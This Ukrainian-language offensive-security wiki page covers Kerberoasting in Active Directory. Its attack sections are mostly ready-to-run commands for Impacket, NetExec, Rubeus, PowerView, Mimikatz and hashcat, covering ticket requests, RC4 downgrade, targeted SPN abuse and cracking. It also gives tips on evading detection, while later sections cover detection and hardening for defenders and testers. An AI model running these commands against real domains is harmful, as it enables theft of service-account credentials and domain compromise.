# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting зосереджений на отриманні TGS-квитків, зокрема пов’язаних із сервісами, що працюють під обліковими записами користувачів в Active Directory (AD), за винятком облікових записів комп’ютерів. Для шифрування цих квитків використовуються ключі, похідні від паролів користувачів, що дає змогу здійснювати offline cracking облікових даних. Використання облікового запису користувача як сервісу визначається непорожньою властивістю ServicePrincipalName (SPN).

Будь-який автентифікований користувач домену може запитувати TGS-квитки, тому спеціальні привілеї не потрібні.<sup>[[4]](#references)[[5]](#references)</sup>

### Основні моменти

- Ціллю є TGS-квитки для сервісів, що працюють під обліковими записами користувачів (тобто обліковими записами з установленим SPN; не обліковими записами комп’ютерів).
- Квитки зашифровані ключем, похідним від пароля облікового запису сервісу, і можуть бути зламані offline.
- Підвищені привілеї не потрібні; будь-який автентифікований обліковий запис може запитувати TGS-квитки.

> [!WARNING]
> Більшість публічних інструментів надають перевагу запитанню сервісних квитків RC4-HMAC (etype 23), оскільки їх легше crack-ити, ніж AES. RC4 TGS-хеші починаються з `$krb5tgs$23$*`, AES128 — з `$krb5tgs$17$*`, а AES256 — з `$krb5tgs$18$*`. Однак багато середовищ переходять на режим лише AES. Не припускайте, що актуальним є тільки RC4.
> Також уникайте roasting за принципом “spray-and-pray”. Стандартний kerberoast у Rubeus може опитувати та запитувати квитки для всіх SPN, що створює багато шуму. Спочатку перераховуйте цікаві principals і націлюйтеся саме на них.

### Секрети облікових записів сервісів і вартість криптографії Kerberos

Багато сервісів досі працюють під обліковими записами користувачів із паролями, якими керують вручну. KDC шифрує сервісні квитки ключами, похідними від цих паролів, і передає ciphertext будь-якому автентифікованому principal, тому kerberoasting надає необмежену кількість offline-спроб без блокувань або телеметрії DC. Режим шифрування визначає бюджет cracking:

| Режим | Виведення ключа | Тип шифрування | Орієнтовна продуктивність RTX 5090* | Примітки |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 із 4 096 ітераціями та сіллю для кожного principal, згенерованою з домену + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6,8 мільйона спроб/с | Сіль унеможливлює rainbow tables, але все одно дає змогу швидко crack-ити короткі паролі. |
| RC4 + NT hash | Одноразове MD4 від пароля (несолений NT hash); Kerberos додає лише 8-байтовий confounder для кожного квитка | etype 23 (`$krb5tgs$23$`) | ~4,18 **мільярда** спроб/с | Приблизно у 1000 разів швидше за AES; атакувальники примусово використовують RC4, якщо це дозволяє `msDS-SupportedEncryptionTypes`. |

*Бенчмарки Chick3nman, наведені в [аналізі Kerberoasting від Matthew Green](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

Confounder RC4 лише рандомізує keystream; він не додає обчислень для кожної спроби. Якщо облікові записи сервісів не використовують випадкові секрети (gMSA/dMSA, облікові записи комп’ютерів або рядки, якими керує vault), швидкість компрометації визначається виключно GPU-бюджетом. Примусове використання лише AES-типів etype усуває downgrade до мільярда спроб за секунду, але слабкі паролі людей усе одно піддаються PBKDF2.<sup>[[3]](#references)</sup>

### Атака

#### Linux

Практичний наскрізний приклад використання NetExec для запиту roastable-квитків і Hashcat для їх cracking доступний у посиланні [1].<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Багатофункціональні інструменти, що містять перевірки kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Перелічити користувачів kerberoastable
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: Запросити TGS і витягти з пам’яті
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2: Automatic tools
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Запит TGS генерує Windows Security Event 4769 (було запитано службовий квиток Kerberos).

### OPSEC та середовища, що використовують лише AES

- Навмисно запитуйте RC4 для облікових записів без AES:
- Rubeus: `/rc4opsec` використовує tgtdeleg для переліку облікових записів без AES і запитує службові квитки RC4.
- Rubeus: `/tgtdeleg` разом із kerberoast також ініціює запити RC4, де це можливо.<sup>[[6]](#references)</sup>
- Виконуйте roast облікових записів, що використовують лише AES, замість мовчазного завершення з помилкою:
- Rubeus: `/aes` перелічує облікові записи з увімкненим AES і запитує службові квитки AES (etype 17/18).
- Якщо ви вже маєте TGT (через PTT або з `.kirbi`), можна використовувати `/ticket:<blob|path>` разом із `/spn:<SPN>` або `/spns:<file>` і пропустити LDAP.
- Вибір цілей, обмеження частоти та зменшення шуму:
- Використовуйте `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` і `/jitter:<1-100>`.
- Фільтруйте облікові записи з імовірно слабкими паролями за допомогою `/pwdsetbefore:<MM-dd-yyyy>` (старіші паролі) або націлюйтеся на привілейовані OU за допомогою `/ou:<DN>`.<sup>[[8]](#references)</sup>

Приклади (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Зламування
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Якщо ви контролюєте обліковий запис або можете його змінювати, ви можете зробити його kerberoastable, додавши SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Знизити рівень облікового запису, щоб увімкнути RC4 для спрощення cracking (потрібні права запису для цільового об’єкта):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast через GenericWrite/GenericAll над користувачем (тимчасовий SPN)

Коли BloodHound показує, що ви контролюєте об'єкт користувача (наприклад, GenericWrite/GenericAll), ви можете надійно виконати “targeted-roast” для цього конкретного користувача, навіть якщо наразі він не має жодних SPN:<sup>[[9]](#references)</sup>

- Додайте тимчасовий SPN до контрольованого користувача, щоб зробити його придатним для roast.
- Запросіть TGS-REP, зашифрований за допомогою RC4 (etype 23), для цього SPN, щоб підвищити ефективність cracking.
- Розкрийте хеш `$krb5tgs$23$...` за допомогою hashcat.
- Видаліть SPN, щоб зменшити footprint.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Однорядкова команда Linux (`targetedKerberoast.py` автоматизує add SPN -> request TGS (etype 23) -> remove SPN):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Зламайте отриманий результат за допомогою hashcat autodetect (режим 13100 для `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Примітки щодо виявлення: додавання/видалення SPN спричиняє зміни в каталозі (Event ID 5136/4738 для цільового користувача), а запит TGS генерує Event ID 4769. Розгляньте можливість обмеження частоти запитів і очищення артефактів.

Корисні інструменти для атак kerberoast можна знайти тут: https://github.com/nidem/kerberoast

Якщо в Linux ви отримуєте цю помилку: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, вона виникає через розбіжність локального часу. Синхронізуйте час із DC:

- `ntpdate <DC_IP>` (застаріло в деяких дистрибутивах)
- `rdate -n <DC_IP>`

### Kerberoast без облікового запису домену (AS-requested STs)

У вересні 2022 року Charlie Clark показав, що якщо principal не вимагає попередньої автентифікації, можна отримати service ticket за допомогою спеціально сформованого KRB_AS_REQ, змінивши sname у тілі запиту, фактично отримавши service ticket замість TGT. Це повторює AS-REP roasting і не потребує дійсних облікових даних домену.

Деталі наведено у матеріалі Semperis “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Ви повинні надати список користувачів, оскільки без дійсних облікових даних неможливо виконати запит до LDAP за допомогою цієї техніки.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Пов’язане

Якщо ви націлені на користувачів, доступних для AS-REP roasting, див. також:

{{#ref}}
asreproast.md
{{#endref}}

### Виявлення

Kerberoasting може бути непомітним. Шукайте Event ID 4769 від DCs і застосовуйте фільтри, щоб зменшити шум:

- Виключіть ім’я служби `krbtgt` та імена служб, що закінчуються на `$` (облікові записи комп’ютерів).
- Виключіть запити від облікових записів машин (`*$$@*`).
- Лише успішні запити (Failure Code `0x0`).
- Відстежуйте типи шифрування: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Не створюйте сповіщення лише для `0x17`.

Приклад тріажу в PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Додаткові ідеї:

- Визначити базовий рівень нормального використання SPN для кожного хоста/користувача; створювати сповіщення про великі сплески різноманітних запитів SPN від одного принципала.
- Виявляти нетипове використання RC4 у доменах, захищених AES.

### Mitigation / Hardening

- Використовуйте gMSA/dMSA або облікові записи комп’ютерів для служб. Керовані облікові записи мають випадкові паролі довжиною понад 120 символів і автоматично змінюють їх, що робить offline cracking недоцільним.<sup>[[7]](#references)</sup>
- Примусово використовуйте AES для облікових записів служб, задавши `msDS-SupportedEncryptionTypes` лише для AES (десяткове значення 24 / шістнадцяткове 0x18), а потім змініть пароль, щоб ключі AES були похідними від нового пароля.<sup>[[7]](#references)</sup>
- Якщо можливо, вимкніть RC4 у своєму середовищі та відстежуйте спроби використання RC4. На DC можна використовувати значення реєстру `DefaultDomainSupportedEncTypes`, щоб визначати значення за замовчуванням для облікових записів, у яких `msDS-SupportedEncryptionTypes` не задано. Ретельно протестуйте зміни.
- Видаліть непотрібні SPN з облікових записів користувачів.<sup>[[7]](#references)</sup>
- Використовуйте довгі випадкові паролі для облікових записів служб (25+ символів), якщо керовані облікові записи недоступні; забороніть поширені паролі та регулярно проводьте аудит.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – практичне використання NetExec LDAP kerberoast і cracking за допомогою hashcat](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: атаки з низькими технічними вимогами та значним впливом на основі застарілої криптографії Kerberos (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Як атакувати Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Зловживання Active Directory Kerberos: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: запит TGS із шифруванням RC4, коли ввімкнено AES](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – рекомендації Microsoft щодо зменшення ризику Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – документація команд kerberoast для Rubeus](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — облікові дані SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync до DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – нові шляхи атак? AS Requested Service Tickets (Charlie Clark, вересень 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
